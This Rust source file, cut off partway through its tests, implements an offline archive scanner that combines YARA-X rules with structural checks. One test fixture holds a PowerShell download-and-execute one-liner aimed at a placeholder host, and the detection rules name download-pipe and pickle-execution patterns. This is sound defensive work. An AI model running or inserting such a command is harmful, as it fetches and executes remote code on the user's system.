//! Built-in offline static inspection. Neither archive bytes nor model code are executed.
use serde::{Deserialize, Serialize};
use std::{
    io::{Read, Write},
    path::Path,
    sync::{
        atomic::{AtomicBool, Ordering},
        OnceLock,
    },
    time::{Duration, Instant},
};
use wonrar_core::{ArchiveInfo, Entry, Progress};

pub mod worker;

pub const ENGINE_VERSION: &str = "yara-x/1.21.0; wonrar-scan/0.1.0";
pub const RULE_VERSION: &str = "2026.10.14.1";
pub const ENGINE: &str = "YARA-X + WonRaR structural inspection";
const RULES: &str = include_str!("../rules/baseline.yar");

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanFinding {
    pub code: String,
    pub severity: String,
    pub message: String,
    pub entry_id: String,
    pub path: String,
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SkippedEntry {
    pub entry_id: String,
    pub path: String,
    pub reason: String,
}
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Coverage {
    pub total_files: usize,
    pub scanned_files: usize,
    pub skipped_files: usize,
    pub truncated_files: usize,
    pub decoded_bytes: u64,
    pub nested_archives: usize,
    pub opaque_containers: usize,
    pub complete: bool,
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanLimits {
    pub max_entries: usize,
    pub max_entry_bytes: u64,
    pub max_total_bytes: u64,
    pub max_duration_secs: u64,
    pub max_depth: usize,
}
impl Default for ScanLimits {
    fn default() -> Self {
        Self {
            max_entries: 2_000,
            max_entry_bytes: 8 * 1024 * 1024,
            max_total_bytes: 128 * 1024 * 1024,
            max_duration_secs: 60,
            max_depth: 1,
        }
    }
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanScope {
    pub kind: String,
    pub entry_ids: Vec<String>,
    pub selected_files: usize,
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanReport {
    pub scope: ScanScope,
    pub status: String,
    pub message: String,
    pub archive_path: String,
    pub archive_identity: String,
    pub engine: String,
    pub engine_version: String,
    pub rule_version: String,
    pub structural_findings: Vec<ScanFinding>,
    pub rule_findings: Vec<ScanFinding>,
    pub coverage: Coverage,
    pub skipped: Vec<SkippedEntry>,
    pub elapsed_ms: u64,
    pub limits: ScanLimits,
    pub warnings: Vec<String>,
}

fn compiled_rules() -> Result<&'static yara_x::Rules, String> {
    static COMPILED: OnceLock<Result<yara_x::Rules, String>> = OnceLock::new();
    COMPILED
        .get_or_init(|| {
            let mut compiler = yara_x::Compiler::new();
            compiler
                .add_source(RULES)
                .map_err(|e| format!("Built-in rules did not compile: {e}"))?;
            Ok(compiler.build())
        })
        .as_ref()
        .map_err(Clone::clone)
}
fn rule_description(id: &str) -> (&str, &str) {
    match id {
    "WonRaR_Test_Sentinel" => ("test","Benign WonRaR scanner test marker matched. This is a test finding, not malware."),
    "WonRaR_EICAR_Test_File" => ("test","EICAR antivirus test marker matched. This is a non-malicious detector test string."),
    "WonRaR_PowerShell_Download_And_Execute" => ("warning","PowerShell download and expression-execution indicators occur together. Review the file; this static pattern does not establish malicious behavior."),
    "WonRaR_Shell_Download_Pipe_Execution" => ("warning","Download command and shell-pipe execution indicators occur together. Common installers can match; review the command source."),
    "WonRaR_Python_Deserialization_With_Process_Call" => ("warning","Python pickle deserialization and process-call indicators occur together. Review the code before loading serialized objects."),
    _ => ("info","A bundled static inspection rule matched."),
}
}
fn cancelled(cancel: &AtomicBool) -> Result<(), String> {
    if cancel.load(Ordering::Relaxed) {
        Err("Scan cancelled; no complete report was produced.".into())
    } else {
        Ok(())
    }
}
fn finding(code: &str, severity: &str, message: &str, id: &str, path: &str) -> ScanFinding {
    ScanFinding {
        code: code.into(),
        severity: severity.into(),
        message: message.into(),
        entry_id: id.into(),
        path: path.into(),
    }
}
fn binary_kind(bytes: &[u8]) -> Option<&'static str> {
    if bytes.len() >= 64 && bytes.starts_with(b"MZ") {
        let offset = u32::from_le_bytes(bytes[60..64].try_into().ok()?) as usize;
        if offset.checked_add(4).is_some_and(|end| end <= bytes.len())
            && &bytes[offset..offset + 4] == b"PE\0\0"
        {
            return Some("PE");
        }
    }
    if bytes.len() >= 16
        && bytes.starts_with(b"\x7fELF")
        && [1, 2].contains(&bytes[4])
        && [1, 2].contains(&bytes[5])
    {
        return Some("ELF");
    }
    if bytes.len() >= 28
        && [
            b"\xcf\xfa\xed\xfe".as_slice(),
            b"\xce\xfa\xed\xfe",
            b"\xfe\xed\xfa\xcf",
            b"\xfe\xed\xfa\xce",
        ]
        .iter()
        .any(|magic| bytes.starts_with(magic))
    {
        return Some("Mach-O");
    }
    None
}
fn nested_suffix(name: &str, bytes: &[u8]) -> Option<&'static str> {
    if bytes.starts_with(b"MRAR\r\n\x1a\n") {
        Some(".mrar")
    } else if bytes.starts_with(b"PK\x03\x04") || bytes.starts_with(b"PK\x05\x06") {
        Some(".zip")
    } else if bytes.starts_with(b"7z\xbc\xaf\x27\x1c") {
        Some(".7z")
    } else if bytes.starts_with(b"Rar!") {
        Some(".rar")
    } else if bytes.starts_with(b"\x1f\x8b") {
        Some(".tar.gz")
    } else if bytes.starts_with(b"\xfd7zXZ\0") {
        Some(".tar.xz")
    } else if bytes.starts_with(b"\x28\xb5\x2f\xfd") {
        Some(".tar.zst")
    } else if bytes.starts_with(b"BZh") {
        Some(".tar.bz2")
    } else if bytes.get(257..262) == Some(b"ustar") || name.to_ascii_lowercase().ends_with(".tar") {
        Some(".tar")
    } else {
        let lower = name.to_ascii_lowercase();
        [
            ".zip", ".7z", ".mrar", ".rar", ".tar", ".gz", ".bz2", ".xz", ".zst", ".tgz", ".tbz2",
            ".txz", ".tzst",
        ]
        .into_iter()
        .find(|suffix| lower.ends_with(suffix))
    }
}

struct Inspection<'a> {
    report: ScanReport,
    started: Instant,
    cancel: &'a AtomicBool,
    progress: &'a dyn Fn(Progress),
    scanner: yara_x::Scanner<'static>,
    visited: usize,
}
impl Inspection<'_> {
    fn skip(&mut self, id: &str, path: &str, reason: impl Into<String>) {
        self.report.coverage.skipped_files += 1;
        self.record_gap(id, path, reason);
    }
    fn opaque(&mut self, id: &str, path: &str, reason: impl Into<String>) {
        self.report.coverage.opaque_containers += 1;
        self.record_gap(id, path, reason);
    }
    fn record_gap(&mut self, id: &str, path: &str, reason: impl Into<String>) {
        if self.report.skipped.len() < 500 {
            self.report.skipped.push(SkippedEntry {
                entry_id: id.into(),
                path: path.into(),
                reason: reason.into(),
            });
        } else if !self
            .report
            .warnings
            .iter()
            .any(|s| s == "Skipped-entry detail limited to 500 records.")
        {
            self.report
                .warnings
                .push("Skipped-entry detail limited to 500 records.".into());
        }
    }
    fn add_structure(&mut self, f: ScanFinding) {
        if self.report.structural_findings.len() < 500 {
            self.report.structural_findings.push(f);
        } else if !self
            .report
            .warnings
            .iter()
            .any(|s| s == "Structural findings limited to 500 records.")
        {
            self.report
                .warnings
                .push("Structural findings limited to 500 records.".into());
            self.report.coverage.complete = false;
        }
    }
    fn content(&mut self, e: &Entry, bytes: &[u8], id: &str, path: &str) -> Result<(), String> {
        let lower = e.name.to_ascii_lowercase();
        let extension = lower.rsplit('.').next().unwrap_or("");
        if let Some(kind) = binary_kind(bytes) {
            self.add_structure(finding("executable_binary","info",&format!("{kind} executable-format signature detected. This identifies a file type, not malware."),id,path));
            let plausible = match kind {
                "PE" => ["exe", "dll", "sys", "scr", "ocx", "efi"].contains(&extension),
                "ELF" => ["so", "bin", "run", "out"].contains(&extension) || !e.name.contains('.'),
                _ => ["dylib", "bundle", "bin"].contains(&extension) || !e.name.contains('.'),
            };
            if !plausible {
                self.add_structure(finding("extension_magic_mismatch","warning",&format!("{kind} binary content does not match the filename extension. Verify the intended file type."),id,path));
            }
        }
        if ["exe", "scr", "com", "bat", "cmd", "ps1", "vbs", "js", "lnk"].contains(&extension) {
            let stem = lower
                .strip_suffix(extension)
                .unwrap_or(&lower)
                .trim_end_matches('.');
            if [
                ".pdf", ".doc", ".docx", ".jpg", ".png", ".txt", ".xls", ".xlsx",
            ]
            .iter()
            .any(|ext| stem.ends_with(ext))
            {
                self.add_structure(finding("double_extension","warning","A document or image suffix is followed by an executable/script suffix. Review the full filename before opening.",id,path));
            }
        }
        if ["pkl", "pickle", "joblib"].contains(&extension)
            || (bytes.first() == Some(&0x80) && bytes.get(1).is_some_and(|v| (2..=5).contains(v)))
        {
            self.add_structure(finding("pickle_serialization","warning","Possible Python pickle serialization. Loading untrusted pickle data can execute code; contents were inspected as bytes only.",id,path));
        }
        let matches = self
            .scanner
            .scan(bytes)
            .map_err(|e| format!("Static rule scan did not complete: {e}"))?
            .matching_rules()
            .map(|r| r.identifier().to_owned())
            .collect::<Vec<_>>();
        for rule in matches {
            if self.report.rule_findings.len() >= 500 {
                self.report
                    .warnings
                    .push("Rule findings limited to 500 records.".into());
                self.report.coverage.complete = false;
                break;
            }
            let (severity, message) = rule_description(&rule);
            self.report
                .rule_findings
                .push(finding(&rule, severity, message, id, path));
        }
        Ok(())
    }
    fn archive(
        &mut self,
        path: &Path,
        password: Option<&str>,
        info: ArchiveInfo,
        chain: &str,
        depth: usize,
    ) -> Result<(), String> {
        let expected = info.identity.clone();
        let mut entries =
            wonrar_core::EntryInspectionSession::open(path, password, &expected, self.cancel)
                .map_err(|e| e.to_string())?;
        let files: Vec<_> = info.entries.iter().filter(|e| !e.is_dir).collect();
        self.report.coverage.total_files += files.len();
        for f in &info.findings {
            if f.code == "inspection_coverage" {
                continue;
            }
            let entry = f.entry_id.clone().unwrap_or_default();
            let source = info
                .entries
                .iter()
                .find(|e| e.id == entry)
                .map(|e| e.name.as_str())
                .unwrap_or("");
            let full = if chain.is_empty() {
                source.to_owned()
            } else {
                format!("{chain}!{source}")
            };
            let id = if chain.is_empty() {
                entry
            } else {
                format!("{chain}!{entry}")
            };
            self.add_structure(finding(
                &f.code,
                if f.code == "encrypted" {
                    "info"
                } else {
                    &f.severity
                },
                &f.message,
                &id,
                &full,
            ));
        }
        for e in files {
            cancelled(self.cancel)?;
            let full = if chain.is_empty() {
                e.name.clone()
            } else {
                format!("{chain}!{}", e.name)
            };
            let id = if chain.is_empty() {
                e.id.clone()
            } else {
                format!("{chain}!{}", e.id)
            };
            if self.visited >= self.report.limits.max_entries {
                self.skip(&id, &full, "Entry inspection limit reached");
                continue;
            }
            self.visited += 1;
            if self.started.elapsed() > Duration::from_secs(self.report.limits.max_duration_secs) {
                self.skip(&id, &full, "Scan duration limit reached");
                continue;
            }
            if e.is_encrypted && password.is_none() {
                self.skip(&id, &full, "Encrypted content requires a password");
                continue;
            }
            let remaining = self
                .report
                .limits
                .max_total_bytes
                .saturating_sub(self.report.coverage.decoded_bytes);
            if remaining == 0 {
                self.skip(&id, &full, "Decoded inspection byte budget reached");
                continue;
            }
            let maximum = remaining.min(self.report.limits.max_entry_bytes);
            let entry = match entries.read(&e.id, maximum) {
                Ok(entry) => entry,
                Err(error) => {
                    cancelled(self.cancel)?;
                    self.skip(&id, &full, error.to_string());
                    continue;
                }
            };
            self.report.coverage.decoded_bytes += entry.bytes.len() as u64;
            if entry.truncated {
                self.report.coverage.truncated_files += 1;
                if self.report.skipped.len() < 500 {
                    self.report.skipped.push(SkippedEntry {
                        entry_id: id.clone(),
                        path: full.clone(),
                        reason: format!(
                            "Only the first {} decoded bytes were inspected",
                            entry.bytes.len()
                        ),
                    });
                }
            }
            match self.content(e, &entry.bytes, &id, &full) {
                Ok(()) => self.report.coverage.scanned_files += 1,
                Err(error) => {
                    self.skip(&id, &full, error);
                    continue;
                }
            }
            (self.progress)(Progress {
                operation: "scan".into(),
                entry: full.clone(),
                completed_entries: self.report.coverage.scanned_files,
                total_entries: self.report.coverage.total_files,
                bytes_processed: self.report.coverage.decoded_bytes,
                total_bytes: 0,
            });
            if let Some(suffix) = nested_suffix(&e.name, &entry.bytes) {
                self.report.coverage.nested_archives += 1;
                if entry.truncated {
                    self.opaque(
                        &id,
                        &full,
                        "Nested archive was truncated and its members were not inspected",
                    );
                } else if depth >= self.report.limits.max_depth {
                    self.opaque(
                        &id,
                        &full,
                        "Nested archive depth limit reached; members not inspected",
                    );
                } else {
                    let basename = e.name.rsplit(['/', '\\']).next().unwrap_or("");
                    if basename.len() > 200 {
                        self.opaque(
                            &id,
                            &full,
                            "Nested filename is too long for a private staging file",
                        );
                        continue;
                    }
                    let mut basename: String = basename
                        .chars()
                        .map(|c| {
                            if c.is_control() || "<>:\"/\\|?*".contains(c) {
                                '_'
                            } else {
                                c
                            }
                        })
                        .collect();
                    basename = basename.trim_end_matches([' ', '.']).to_owned();
                    if basename.is_empty() || basename == "." || basename == ".." {
                        basename = format!("nested{suffix}");
                    }
                    let first = basename
                        .split('.')
                        .next()
                        .unwrap_or("")
                        .to_ascii_uppercase();
                    if ["CON", "PRN", "AUX", "NUL", "COM1", "LPT1"].contains(&first.as_str()) {
                        basename.insert(0, '_');
                    }
                    let directory = tempfile::Builder::new()
                        .prefix("wonrar-nested-")
                        .tempdir()
                        .map_err(|e| e.to_string())?;
                    let staged = directory.path().join(basename);
                    std::fs::write(&staged, &entry.bytes).map_err(|e| e.to_string())?;
                    match wonrar_core::inspect_with_password(&staged, password) {
                        Ok(nested) => self.archive(&staged, password, nested, &full, depth + 1)?,
                        Err(error) => self.opaque(
                            &id,
                            &full,
                            format!("Nested archive members not inspected: {error}"),
                        ),
                    }
                }
            }
        }
        cancelled(self.cancel)?;
        let current =
            wonrar_core::inspect_with_password(path, password).map_err(|e| e.to_string())?;
        if current.identity != expected {
            return Err("Archive changed during inspection; results were discarded. Scan the current file again.".into());
        }
        Ok(())
    }
}

pub fn scan(
    path: &Path,
    password: Option<&str>,
    cancel: &AtomicBool,
    progress: &dyn Fn(Progress),
) -> Result<ScanReport, String> {
    scan_with_limits(path, password, cancel, progress, ScanLimits::default())
}
pub fn scan_with_limits(
    path: &Path,
    password: Option<&str>,
    cancel: &AtomicBool,
    progress: &dyn Fn(Progress),
    limits: ScanLimits,
) -> Result<ScanReport, String> {
    scan_scoped(path, password, None, None, cancel, progress, limits)
}
pub fn scan_selected(
    path: &Path,
    password: Option<&str>,
    entry_ids: &[String],
    expected_identity: &str,
    cancel: &AtomicBool,
    progress: &dyn Fn(Progress),
) -> Result<ScanReport, String> {
    scan_scoped(
        path,
        password,
        Some(entry_ids),
        Some(expected_identity),
        cancel,
        progress,
        ScanLimits::default(),
    )
}
pub fn scan_scoped(
    path: &Path,
    password: Option<&str>,
    entry_ids: Option<&[String]>,
    expected_identity: Option<&str>,
    cancel: &AtomicBool,
    progress: &dyn Fn(Progress),
    limits: ScanLimits,
) -> Result<ScanReport, String> {
    cancelled(cancel)?;
    if entry_ids.is_some_and(|ids| ids.is_empty()) {
        return Err("Selected scan requires at least one file entry ID.".into());
    }
    if entry_ids.is_some() && expected_identity.is_none_or(str::is_empty) {
        return Err("Selected scan requires the reviewed archive identity.".into());
    }
    if limits.max_entry_bytes == 0
        || limits.max_entry_bytes > 16 * 1024 * 1024
        || limits.max_total_bytes == 0
        || limits.max_total_bytes > 512 * 1024 * 1024
        || limits.max_entries == 0
        || limits.max_entries > 10_000
        || limits.max_depth > 2
        || limits.max_duration_secs == 0
        || limits.max_duration_secs > 120
    {
        return Err("Invalid scan limits".into());
    }
    let started = Instant::now();
    let metadata = std::fs::metadata(path).map_err(|e| e.to_string())?;
    if !metadata.is_file() || metadata.len() > 512 * 1024 * 1024 {
        return Err("Built-in scan accepts archive files up to512MiB.".into());
    }
    let info = wonrar_core::inspect_with_password(path, password).map_err(|e| e.to_string())?;
    if expected_identity.is_some_and(|expected| expected != info.identity) {
        return Err("Archive changed since review; scan the current inventory again.".into());
    }
    let selected_ids = if let Some(ids) = entry_ids {
        let mut unique = std::collections::BTreeSet::new();
        for id in ids {
            let entry = info
                .entries
                .iter()
                .find(|e| &e.id == id)
                .ok_or_else(|| format!("Unknown selected entry ID: {id}"))?;
            if entry.is_dir {
                return Err(
                    "Selected scan accepts file entries only; expand directories first.".into(),
                );
            }
            unique.insert(id.clone());
        }
        Some(unique)
    } else {
        None
    };
    let scope = ScanScope {
        kind: if selected_ids.is_some() {
            "selection"
        } else {
            "archive"
        }
        .into(),
        entry_ids: selected_ids
            .as_ref()
            .map(|s| s.iter().cloned().collect())
            .unwrap_or_default(),
        selected_files: selected_ids.as_ref().map_or_else(
            || info.entries.iter().filter(|e| !e.is_dir).count(),
            |s| s.len(),
        ),
    };
    // Inspect a private immutable snapshot, not a repeatedly reopened mutable archive.
    let snapshot_dir = tempfile::Builder::new()
        .prefix("wonrar-inspection-")
        .tempdir()
        .map_err(|e| e.to_string())?;
    let snapshot_path = snapshot_dir
        .path()
        .join(path.file_name().ok_or("Archive has no filename")?);
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    let mut snapshot = options.open(&snapshot_path).map_err(|e| e.to_string())?;
    let mut source = std::fs::File::open(path).map_err(|e| e.to_string())?;
    let mut buffer = [0u8; 65536];
    let mut copied = 0u64;
    loop {
        cancelled(cancel)?;
        if started.elapsed() > Duration::from_secs(limits.max_duration_secs) {
            return Err("Scan duration limit reached while staging archive".into());
        }
        let n = source.read(&mut buffer).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        copied += n as u64;
        if copied > 512 * 1024 * 1024 {
            return Err("Archive exceeded snapshot byte limit".into());
        }
        snapshot
            .write_all(&buffer[..n])
            .map_err(|e| e.to_string())?;
    }
    snapshot.flush().map_err(|e| e.to_string())?;
    drop(snapshot);
    let mut stable_info =
        wonrar_core::inspect_with_password(&snapshot_path, password).map_err(|e| e.to_string())?;
    if stable_info.identity != info.identity {
        return Err("Archive changed while staging; inspection was discarded".into());
    }
    if let Some(ids) = &selected_ids {
        stable_info.entries.retain(|entry| ids.contains(&entry.id));
        stable_info
            .findings
            .retain(|f| f.entry_id.as_ref().is_some_and(|id| ids.contains(id)));
    }
    let mut scanner = yara_x::Scanner::new(compiled_rules()?);
    scanner.set_timeout(Duration::from_secs(2));
    scanner.max_scan_size(limits.max_entry_bytes as usize);
    let report=ScanReport{scope,status:String::new(),message:String::new(),archive_path:info.path.clone(),archive_identity:info.identity.clone(),engine:ENGINE.into(),engine_version:ENGINE_VERSION.into(),rule_version:RULE_VERSION.into(),structural_findings:vec![],rule_findings:vec![],coverage:Coverage{complete:true,..Coverage::default()},skipped:vec![],elapsed_ms:0,limits,warnings:vec!["Bundled baseline rules and static indicators are limited coverage, not a comprehensive antivirus database or a safety guarantee.".into(),"No code, documents, serialized objects, installers or archive scripts were executed. No archive content was uploaded.".into(),"Solid/container decoding may process preceding bytes beyond the scanned entry buffer; decoder resource limits depend on worker controls.".into()]};
    let mut operation = Inspection {
        report,
        started,
        cancel,
        progress,
        scanner,
        visited: 0,
    };
    operation.archive(&snapshot_path, password, stable_info, "", 0)?;
    let current = wonrar_core::inspect_with_password(path, password).map_err(|e| e.to_string())?;
    if current.identity != operation.report.archive_identity {
        return Err("Archive changed during inspection; results were discarded.".into());
    }
    operation.report.coverage.complete &= operation.report.coverage.skipped_files == 0
        && operation.report.coverage.truncated_files == 0
        && operation.report.coverage.opaque_containers == 0;
    let findings = operation.report.rule_findings.len()
        + operation
            .report
            .structural_findings
            .iter()
            .filter(|f| ["warning", "error"].contains(&f.severity.as_str()))
            .count();
    operation.report.status = if findings > 0 {
        "findings"
    } else if !operation.report.coverage.complete {
        "incomplete"
    } else {
        "no_findings"
    }
    .into();
    operation.report.message = if findings > 0 {
        format!("{findings} static findings; inspection coverage {}. Review evidence and test/heuristic labels.",if operation.report.coverage.complete{"complete within configured limits"}else{"incomplete"})
    } else if !operation.report.coverage.complete {
        "No findings in inspected bytes; inspection incomplete. Review skipped and truncated entries.".into()
    } else {
        "No findings in completed baseline checks. This does not establish that the archive is safe.".into()
    };
    if operation.report.scope.kind == "selection" {
        operation.report.message = format!("Selected files only: {}", operation.report.message);
        operation.report.warnings.push("This report covers the selected file entries and bounded nested contents only; unrelated archive entries were not scanned.".into());
    }
    operation.report.elapsed_ms = started.elapsed().as_millis().min(u64::MAX as u128) as u64;
    Ok(operation.report)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{Cursor, Write};
    fn fixture(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let mut archive = zip::ZipWriter::new(Cursor::new(Vec::new()));
        for (name, data) in entries {
            archive
                .start_file(*name, zip::write::SimpleFileOptions::default())
                .unwrap();
            archive.write_all(data).unwrap();
        }
        archive.finish().unwrap().into_inner()
    }
    fn inspect(data: &[u8], limits: ScanLimits) -> ScanReport {
        let temp = tempfile::NamedTempFile::new().unwrap();
        std::fs::write(temp.path(), data).unwrap();
        scan_with_limits(temp.path(), None, &AtomicBool::new(false), &|_| {}, limits).unwrap()
    }
    #[test]
    fn bundled_rules_scan_real_decoded_bytes() {
        let report = inspect(
            &fixture(&[("test.txt", b"WONRAR-BENIGN-SCAN-TEST-2026")]),
            ScanLimits::default(),
        );
        assert_eq!(report.status, "findings");
        assert!(report
            .rule_findings
            .iter()
            .any(|f| f.code == "WonRaR_Test_Sentinel" && f.severity == "test"));
        assert!(report.coverage.complete);
    }
    #[test]
    fn eicar_is_labeled_as_nonmalicious_test() {
        let data = [
            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$".as_slice(),
            b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
        ]
        .concat();
        let report = inspect(&fixture(&[("eicar.txt", &data)]), ScanLimits::default());
        assert!(report
            .rule_findings
            .iter()
            .any(|f| f.code == "WonRaR_EICAR_Test_File" && f.severity == "test"));
    }
    #[test]
    fn benign_urls_and_document_text_do_not_match_behavior_rules() {
        let report=inspect(&fixture(&[("README.md",b"Read installation instructions at https://example.invalid. curl --version reports the version.")]),ScanLimits::default());
        assert_eq!(report.status, "no_findings");
        assert!(report.coverage.complete);
        assert_eq!(report.coverage.scanned_files, 1);
    }
    #[test]
    fn download_execute_combo_is_a_review_signal() {
        let report = inspect(
            &fixture(&[(
                "setup.ps1",
                b"IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/setup')",
            )]),
            ScanLimits::default(),
        );
        assert!(
            report
                .rule_findings
                .iter()
                .any(|f| f.code == "WonRaR_PowerShell_Download_And_Execute"
                    && f.severity == "warning")
        );
    }
    #[test]
    fn native_binary_headers_and_mismatched_extension_are_reported() {
        let mut pe = vec![0u8; 128];
        pe[..2].copy_from_slice(b"MZ");
        pe[60..64].copy_from_slice(&64u32.to_le_bytes());
        pe[64..68].copy_from_slice(b"PE\0\0");
        let report = inspect(
            &fixture(&[("invoice.pdf", &pe), ("invoice.pdf.exe", b"fixture")]),
            ScanLimits::default(),
        );
        assert!(report
            .structural_findings
            .iter()
            .any(|f| f.code == "extension_magic_mismatch"));
        assert!(report
            .structural_findings
            .iter()
            .any(|f| f.code == "double_extension"));
    }
    #[test]
    fn nested_zip_is_scanned_and_depth_gaps_remain_visible() {
        let nested = fixture(&[("marker.txt", b"WONRAR-BENIGN-SCAN-TEST-2026")]);
        let outer = fixture(&[("nested.zip", &nested)]);
        let report = inspect(&outer, ScanLimits::default());
        assert_eq!(report.coverage.nested_archives, 1);
        assert!(report
            .rule_findings
            .iter()
            .any(|f| f.path == "nested.zip!marker.txt"));
        let limits = ScanLimits {
            max_depth: 0,
            ..ScanLimits::default()
        };
        let report = inspect(&outer, limits);
        assert!(!report.coverage.complete);
        assert_eq!(report.coverage.skipped_files, 0);
        assert_eq!(report.coverage.opaque_containers, 1);
        assert!(report
            .skipped
            .iter()
            .any(|e| e.reason.contains("depth limit")));
    }
    #[test]
    fn decoded_prefix_and_entry_limits_mark_incomplete() {
        let report = inspect(
            &fixture(&[
                ("first.txt", b"ordinary text"),
                ("second.txt", b"more text"),
            ]),
            ScanLimits {
                max_entries: 1,
                max_entry_bytes: 4,
                ..ScanLimits::default()
            },
        );
        assert!(!report.coverage.complete);
        assert_eq!(report.coverage.truncated_files, 1);
        assert_eq!(report.coverage.skipped_files, 1);
        assert_eq!(report.coverage.decoded_bytes, 4);
    }
    #[test]
    fn tar_and_extensionless_gzip_use_the_same_builtin_rules() {
        let marker = b"WONRAR-BENIGN-SCAN-TEST-2026";
        let mut archive = tar::Builder::new(Vec::new());
        let mut header = tar::Header::new_gnu();
        header.set_size(marker.len() as u64);
        header.set_mode(0o600);
        header.set_cksum();
        archive
            .append_data(&mut header, "paper.tex", marker.as_slice())
            .unwrap();
        let bytes = archive.into_inner().unwrap();
        let plain = inspect(&bytes, ScanLimits::default());
        assert!(plain.rule_findings.iter().any(|f| f.path == "paper.tex"));
        let mut gzip = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        gzip.write_all(&bytes).unwrap();
        let compressed = gzip.finish().unwrap();
        let report = inspect(&compressed, ScanLimits::default());
        assert!(report.coverage.complete);
        assert!(report.rule_findings.iter().any(|f| f.path == "paper.tex"));
    }
    #[test]
    fn nested_zstd_members_are_inspected() {
        let compressed =
            zstd::stream::encode_all(b"WONRAR-BENIGN-SCAN-TEST-2026".as_slice(), 1).unwrap();
        let report = inspect(
            &fixture(&[("payload.txt.zst", &compressed)]),
            ScanLimits::default(),
        );
        assert_eq!(report.coverage.nested_archives, 1);
        assert!(report.coverage.complete);
        assert!(report
            .rule_findings
            .iter()
            .any(|f| f.path == "payload.txt.zst!payload.txt"));
    }
    #[test]
    fn nested_gzip_preserves_original_filename_type() {
        let mut pe = vec![0u8; 128];
        pe[..2].copy_from_slice(b"MZ");
        pe[60..64].copy_from_slice(&64u32.to_le_bytes());
        pe[64..68].copy_from_slice(b"PE\0\0");
        let mut compressor =
            flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        compressor.write_all(&pe).unwrap();
        let compressed = compressor.finish().unwrap();
        let report = inspect(
            &fixture(&[("program.exe.gz", &compressed)]),
            ScanLimits::default(),
        );
        assert!(report.coverage.complete);
        assert!(report
            .structural_findings
            .iter()
            .any(|f| f.code == "executable_binary" && f.path == "program.exe.gz!program.exe"));
        assert!(!report
            .structural_findings
            .iter()
            .any(|f| f.code == "extension_magic_mismatch"));
    }
    #[test]
    fn top_level_single_gzip_keeps_filename_provenance() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("program.exe.gz");
        let mut pe = vec![0u8; 128];
        pe[..2].copy_from_slice(b"MZ");
        pe[60..64].copy_from_slice(&64u32.to_le_bytes());
        pe[64..68].copy_from_slice(b"PE\0\0");
        let mut compressor =
            flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        compressor.write_all(&pe).unwrap();
        std::fs::write(&path, compressor.finish().unwrap()).unwrap();
        let report = scan(&path, None, &AtomicBool::new(false), &|_| {}).unwrap();
        assert!(report.coverage.complete);
        assert!(report
            .structural_findings
            .iter()
            .any(|f| f.path == "program.exe" && f.code == "executable_binary"));
        assert!(!report
            .structural_findings
            .iter()
            .any(|f| f.code == "extension_magic_mismatch"));
    }
    #[test]
    fn nested_experimental_mrar_uses_generic_bounded_inspection() {
        let dir = tempfile::tempdir().unwrap();
        let source = dir.path().join("marker.txt");
        let archive = dir.path().join("nested.mrar");
        std::fs::write(&source, b"WONRAR-BENIGN-SCAN-TEST-2026").unwrap();
        wonrar_core::create(&archive, &[source], &AtomicBool::new(false), &|_| {}).unwrap();
        let bytes = std::fs::read(&archive).unwrap();
        assert!(bytes.starts_with(b"MRAR\r\n\x1a\n"));
        let report = inspect(&fixture(&[("nested.mrar", &bytes)]), ScanLimits::default());
        assert_eq!(report.coverage.nested_archives, 1);
        assert!(report.coverage.complete);
        assert!(report
            .rule_findings
            .iter()
            .any(|f| f.path == "nested.mrar!marker.txt" && f.code == "WonRaR_Test_Sentinel"));
        assert_eq!(nested_suffix("without-extension", &bytes), Some(".mrar"));
    }
    #[test]
    fn grouped_mrar_scan_keeps_file_boundaries_and_finds_only_the_marker_file() {
        let dir = tempfile::tempdir().unwrap();
        let source = dir.path().join("related");
        std::fs::create_dir(&source).unwrap();
        for i in 0..32 {
            std::fs::write(
                source.join(format!("{i:02}.txt")),
                if i == 31 {
                    b"WONRAR-BENIGN-SCAN-TEST-2026".as_slice()
                } else {
                    b"Ordinary archived text".as_slice()
                },
            )
            .unwrap();
        }
        let archive = dir.path().join("grouped.mrar");
        let cancel = AtomicBool::new(false);
        wonrar_core::create(&archive, &[source], &cancel, &|_| {}).unwrap();
        let report = scan(&archive, None, &cancel, &|_| {}).unwrap();
        assert!(report.coverage.complete);
        assert_eq!(report.coverage.scanned_files, 32);
        let markers: Vec<_> = report
            .rule_findings
            .iter()
            .filter(|f| f.code == "WonRaR_Test_Sentinel")
            .collect();
        assert_eq!(markers.len(), 1);
        assert_eq!(markers[0].path, "related/31.txt");
    }
    #[test]
    fn selected_files_exclude_unrelated_findings_and_reject_stale_or_invalid_ids() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("selection.zip");
        std::fs::write(
            &path,
            fixture(&[
                ("clean.txt", b"plain words"),
                ("marker.txt", b"WONRAR-BENIGN-SCAN-TEST-2026"),
            ]),
        )
        .unwrap();
        let info = wonrar_core::inspect(&path).unwrap();
        let clean_id = info
            .entries
            .iter()
            .find(|e| e.name == "clean.txt")
            .unwrap()
            .id
            .clone();
        let marker_id = info
            .entries
            .iter()
            .find(|e| e.name == "marker.txt")
            .unwrap()
            .id
            .clone();
        let cancel = AtomicBool::new(false);
        let clean = scan_selected(
            &path,
            None,
            &[clean_id.clone(), clean_id],
            &info.identity,
            &cancel,
            &|_| {},
        )
        .unwrap();
        assert_eq!(clean.scope.kind, "selection");
        assert_eq!(clean.scope.selected_files, 1);
        assert_eq!(clean.scope.entry_ids.len(), 1);
        assert_eq!(clean.coverage.total_files, 1);
